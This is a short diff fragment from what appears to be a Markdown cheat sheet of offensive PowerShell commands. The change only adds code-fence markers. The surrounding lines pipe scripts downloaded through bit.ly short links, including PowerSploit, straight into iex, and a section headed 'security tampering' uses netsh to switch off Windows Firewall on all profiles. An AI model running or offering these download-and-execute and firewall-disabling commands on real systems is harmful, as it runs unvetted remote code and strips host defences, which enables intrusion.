@@ -23,10 +23,10 @@ iex (new-Object Net.WebClient).DownloadString('http://bit.ly/1PdjSHk'); . .\Powe
 
 # PowerSploit Module
 iex (new-Object Net.WebClient).DownloadString('http://bit.ly/28RwLgo'); . .\PowerSploit.ps1
-
+```
 
 ## PRE-REQUISITE: SECURITY TAMPRING
-
+```powershell
 # windows firewall showing / disabling config 
 netsh advfirewall set allprofiles state off
 netsh advfirewall show allprofiles
